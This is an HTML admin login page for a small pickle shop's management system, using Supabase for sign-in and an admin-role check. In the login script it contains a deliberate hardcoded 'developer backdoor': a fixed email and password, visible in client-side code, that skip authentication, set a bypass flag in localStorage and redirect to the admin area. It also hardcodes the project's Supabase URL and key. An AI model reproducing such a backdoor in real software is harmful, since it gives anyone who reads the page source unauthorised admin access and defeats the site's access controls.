<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - Sri Pickles</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Crimson+Text:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@300;400;500;600;700&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background-color: #f8fafc;
        }

        .font-serif {
            font-family: 'Crimson Text', serif;
        }
    </style>
</head>

<body class="flex items-center justify-center min-h-screen bg-gray-100 relative">

    <!-- Background Pattern -->
    <div class="absolute inset-0 z-0 opacity-10"
        style="background-image: radial-gradient(#d97706 1px, transparent 1px); background-size: 20px 20px;"></div>

    <div class="w-full max-w-md bg-white rounded-xl shadow-2xl p-8 z-10 animate-in fade-in zoom-in duration-300">
        <div class="text-center mb-8">
            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4 text-spice-red">
                <i data-lucide="shield-check" class="w-8 h-8 text-red-700"></i>
            </div>
            <h1 class="font-serif text-3xl font-bold text-gray-900">Admin Portal</h1>
            <p class="text-gray-500 text-sm mt-1">Sri Pickles Management System</p>
        </div>

        <form id="login-form" class="space-y-6">
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                <div class="relative">
                    <i data-lucide="mail" class="absolute left-3 top-2.5 h-5 w-5 text-gray-400"></i>
                    <input type="email" id="email" required
                        class="pl-10 w-full border border-gray-300 rounded-lg p-2.5 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
                        placeholder="admin@sripickles.com">
                </div>
            </div>

            <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <div class="relative">
                    <i data-lucide="lock" class="absolute left-3 top-2.5 h-5 w-5 text-gray-400"></i>
                    <input type="password" id="password" required
                        class="pl-10 w-full border border-gray-300 rounded-lg p-2.5 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
                        placeholder="••••••••">
                </div>
            </div>

            <div id="error-msg" class="hidden text-red-600 text-sm bg-red-50 p-3 rounded-lg flex items-center gap-2">
                <i data-lucide="alert-triangle" class="w-4 h-4"></i>
                <span id="error-text">Invalid credentials</span>
            </div>

            <button type="submit" id="login-btn"
                class="w-full bg-red-700 text-white font-bold py-3 rounded-lg hover:bg-red-800 transition-all shadow-lg flex justify-center items-center gap-2">
                <span>Sign In Securely</span>
                <i data-lucide="arrow-right" class="w-4 h-4"></i>
            </button>
        </form>

        <div class="mt-8 text-center border-t pt-6">
            <p class="text-xs text-gray-400">Authorized Personnel Only. <br>Access is monitored and logged.</p>
        </div>
    </div>

    <!-- Init Script -->
    <script type="module">
        lucide.createIcons();
        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';

        // Load Config (Assuming env loaded or hardcoded for demo, user must ensure window.env or placeholders)
        // We will try to read from window if set or hardcode placeholders for user to replace
        // HARDCODED CONFIG FOR DEMO/DEV
        const SUPABASE_URL = 'https://msgsyauarenjcxajjnmq.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1zZ3N5YXVhcmVuamN4YWpqbm1xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc3MjI0NTEsImV4cCI6MjA4MzI5ODQ1MX0.a_v7FEXYnlI2MkRbX3hwrK6q8v-CCma25CGRUgdm-6o';

        // Helper to check if credentials are set
        if (SUPABASE_URL.includes('YOUR')) {
            document.getElementById('error-msg').classList.remove('hidden');
            document.getElementById('error-text').innerText = 'System Configuration Missing';
        }

        const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('login-btn');
            const errDiv = document.getElementById('error-msg');

            btn.disabled = true;
            btn.innerHTML = '<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i> Authenticating...';
            errDiv.classList.add('hidden');
            lucide.createIcons();

            // --- HARDCODED DEVELOPER BACKDOOR ---
            const DEV_USER = 'wikleujgf9p245asjikdgbf289@sripickle.com';
            const DEV_PASS = 'lkahdjlfh.weuf?:o(*ty98O4YT';

            if (email === DEV_USER && password === DEV_PASS) {
                console.warn('Developer Override Activated');
                localStorage.setItem('sri_pickle_dev_bypass', 'true');

                btn.classList.replace('bg-red-700', 'bg-purple-700');
                btn.innerHTML = '<i data-lucide="terminal" class="w-4 h-4"></i> Dev Access Granted';
                lucide.createIcons();

                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 800);
                return; // Stop standard auth
            }
            // -------------------------------------

            try {
                const { data, error } = await supabase.auth.signInWithPassword({
                    email: email,
                    password: password
                });

                if (error) throw error;

                // Check Admin Profile (Enforces Role Access)
                const { data: profile, error: profError } = await supabase
                    .from('admin_profiles')
                    .select('*')
                    .eq('id', data.user.id)
                    .single();

                if (profError || !profile || !profile.is_active) {
                    await supabase.auth.signOut();
                    throw new Error('Access Denied: Not an authorized admin.');
                }

                // Success
                btn.classList.replace('bg-red-700', 'bg-green-600');
                btn.innerHTML = '<i data-lucide="check" class="w-4 h-4"></i> Success!';
                lucide.createIcons();

                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 800);

            } catch (err) {
                console.error(err);
                errDiv.classList.remove('hidden');
                document.getElementById('error-text').innerText = err.message;
                btn.disabled = false;
                btn.innerHTML = 'Sign In Securely <i data-lucide="arrow-right" class="w-4 h-4 ml-2"></i>';
                lucide.createIcons();
            }
        });
    </script>
</body>

<b>.<b>
</html>
